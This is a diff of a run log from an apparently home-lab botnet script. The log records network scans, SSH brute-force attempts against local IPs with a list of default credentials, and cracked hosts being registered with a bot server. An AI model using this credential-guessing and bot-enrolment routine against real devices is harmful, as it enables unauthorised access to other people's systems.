@@ -10,10 +10,6 @@ Scanning the Network
 
 Devices on the network
 192.168.1.18
-192.168.1.3
-192.168.1.2
-192.168.1.7
-192.168.1.9
 192.168.1.4
 
 
@@ -29,14 +25,14 @@ trying admin and 54321.
 trying satya and satya.
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    77  100    18  100    59   1225   4018 --:--:-- --:--:-- --:--:--  4538
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    77  100    18  100    59    275    902 --:--:-- --:--:-- --:--:--   907
 {
   "code": 200
 }
 192.168.1.18,satya,satya added
 
 
-Brute forcing the device with IP 192.168.1.3
+Brute forcing the device with IP 192.168.1.4
 trying admin and 1111111.
 trying admin and 1234.
 trying admin and admin1234.
@@ -46,8 +42,61 @@ trying admin and 54321.
 trying satya and satya.
 trying NA and NA.
 
-user name and password not found for 192.168.1.3
+user name and password not found for 192.168.1.4
 
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.4
+192.168.1.18
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  15004  17358 --:--:-- --:--:-- --:--:-- 19666
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
 
 
 Brute forcing the device with IP 192.168.1.2
@@ -64,7 +113,296 @@ user name and password not found for 192.168.1.2
 
 
 
-Brute forcing the device with IP 192.168.1.7
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+./botnet/run.sh: line 23:  5139 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5150 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5165 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5149 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5158 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5168 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5177 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5173 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5235 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5199 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5259 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5258 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5226 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5255 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5246 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5261 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5257 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5253 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5244 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5232 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5245 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5237 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5267 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5265 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5249 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5269 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5271 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5252 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5262 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5274 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5263 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5242 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5248 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5275 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5251 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5270 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5260 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5273 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5266 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5256 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5272 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5268 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5264 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5178 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5228 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5285 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5247 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5347 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5315 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5323 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5460 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5283 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5191 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5449 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5197 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5531 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5461 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5250 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5204 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5351 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5556 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5490 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5470 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5539 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5474 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5559 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5483 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5600 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5507 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5545 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5504 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5552 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5619 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5533 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5607 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5561 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5554 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5535 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5583 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5565 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5560 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5543 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5563 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5542 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5320 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5254 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5300 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5593 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5210 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5333 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5572 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5524 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5598 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5527 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5631 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5632 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5231 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5582 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5564 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5558 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5562 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5618 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5614 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5334 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5332 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5238 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5336 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5312 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5182 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5314 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5566 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5338 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5335 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5187 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5584 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5293 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5636 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5486 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5610 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5549 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5592 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5605 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5452 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5638 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5579 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5421 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5633 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5622 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5635 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5637 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5626 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5627 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5629 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5625 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5634 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5454 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5624 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5623 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5342 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5241 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5223 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5343 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5340 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5594 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5290 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5219 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5595 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5344 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5345 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5243 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5318 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5603 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5321 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5278 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5319 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5322 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5621 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5325 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5313 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5341 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5326 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5305 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5337 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5324 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5302 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5317 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5316 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5295 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5385 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5587 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5608 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5380 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5365 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5371 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5331 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5493 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5515 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5403 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5434 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5590 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5392 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5406 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5518 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5423 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5585 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5438 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5630 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5447 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5628 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5617 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5613 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5615 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5599 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5437 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5412 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5616 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5576 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5381 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5575 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5362 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5387 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5597 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5442 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5477 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5390 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5466 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5569 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5433 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5435 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5450 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5596 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5472 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5432 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5397 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5478 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5436 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5400 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5476 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5439 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5462 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5443 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5440 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5481 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5444 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5441 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5464 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5463 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5445 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5467 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5451 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5448 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5468 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5471 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5455 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5465 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5456 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5453 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5457 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5475 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5469 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5446 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5473 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5458 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5330 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5459 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5529 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5327 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5328 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5329 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  5339 Terminated              ping -c 1 $1 > /dev/null
+192.168.1.18
+192.168.1.2
+192.168.1.4
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    77  100    18  100    59   2698   8845 --:--:-- --:--:-- --:--:--  9833
+{
+  "code": 200
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.2
 trying admin and 1111111.
 trying admin and 1234.
 trying admin and admin1234.
@@ -74,21 +412,7 @@ trying admin and 54321.
 trying satya and satya.
 trying NA and NA.
 
-user name and password not found for 192.168.1.7
-
-
-
-Brute forcing the device with IP 192.168.1.9
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.9
+user name and password not found for 192.168.1.2
 
 
 
@@ -121,16 +445,59 @@ Scanning the Network
 
 
 Devices on the network
-192.168.1.2
 192.168.1.18
-192.168.1.3
-192.168.1.5
 192.168.1.4
-192.168.1.9
 192.168.1.7
+192.168.1.2
 
 
 SSH attempt
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  11432  13225 --:--:-- --:--:-- --:--:-- 14750
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.7
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.7
+
+
 
 Brute forcing the device with IP 192.168.1.2
 trying admin and 1111111.
@@ -146,6 +513,463 @@ user name and password not found for 192.168.1.2
 
 
 
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+./botnet/run.sh: line 23:  6926 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6937 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6934 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6945 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6929 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6950 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6932 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6969 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6941 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6971 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6972 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6942 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6946 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6977 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6982 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6973 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6968 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6960 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6985 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6975 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6970 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6989 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6976 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7001 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6966 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6994 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6967 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6993 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6999 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  6997 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7011 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7010 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7017 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7028 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7013 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7021 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7031 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7040 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7005 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7024 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7048 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7029 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7052 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7034 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7057 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7062 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7058 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7072 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7067 Terminated              ping -c 1 $1 > /dev/null
+./botnet/run.sh: line 23:  7084 Terminated              ping -c 1 $1 > /dev/null
